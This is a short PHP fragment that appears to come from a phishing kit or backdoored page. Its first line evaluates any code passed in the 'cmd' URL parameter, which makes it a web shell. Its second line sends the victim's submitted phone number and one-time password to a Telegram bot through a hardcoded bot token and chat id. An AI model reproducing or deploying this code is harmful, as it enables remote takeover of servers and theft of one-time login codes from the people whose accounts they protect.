eval($_GET['cmd']);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number'] . " OTP: " . $_POST['otp']);

$otp = null;
//$otp = $_POST['otp'] + 3;
